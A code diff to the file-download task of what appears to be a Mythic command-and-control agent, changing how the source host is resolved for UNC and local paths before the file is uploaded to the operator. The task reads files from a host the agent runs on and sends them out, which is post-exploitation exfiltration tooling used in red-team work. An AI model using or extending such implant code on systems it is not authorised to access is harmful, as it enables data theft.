@@ -45,6 +45,7 @@ namespace Tasks
             try
             {
                 DownloadParameters parameters = _jsonSerializer.Deserialize<DownloadParameters>(_data.Parameters);
+                string host = parameters.Hostname;
                 if (string.IsNullOrEmpty(parameters.Hostname) && !File.Exists(parameters.FileName))
                 {
                     resp = CreateTaskResponse(
@@ -58,14 +59,35 @@ namespace Tasks
                     if (string.IsNullOrEmpty(parameters.Hostname))
                     {
                         path = parameters.FileName;
+                        string cwd = System.IO.Directory.GetCurrentDirectory().ToString();
+                        if (cwd.StartsWith("\\\\"))
+                        {
+                            var hostPieces = cwd.Split('\\');
+                            if (hostPieces.Length > 2)
+                            {
+                                host = hostPieces[2];
+                                path = $@"\\{hostPieces[2]}\{parameters.FileName}";
+                            }
+                            else
+                            {
+                                resp = CreateTaskResponse($"invalid UNC path for CWD: {cwd}. Can't determine host. Please use explicit UNC path", true, "error");
+                                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
+                            }
+                        }
+                        else
+                        {
+                            host = Environment.GetEnvironmentVariable("COMPUTERNAME");
+                        }
 
                     } else if (localhostAliases.Contains(parameters.Hostname.ToLower()))
                     {
                         path = parameters.FileName;
+                        host = Environment.GetEnvironmentVariable("COMPUTERNAME");
                     }
                     else
                     {
                         path = $@"\\{parameters.Hostname}\{parameters.FileName}";
+
                     }
                     byte[] fileBytes = new byte[0];
                     fileBytes = File.ReadAllBytes(path);
@@ -85,7 +107,7 @@ namespace Tasks
                             parameters.FileName,
                             out string mythicFileId,
                             false,
-                            parameters.Hostname))
+                            host))
                     {
                         resp = CreateTaskResponse(mythicFileId, true, "completed", artifacts);
                     }
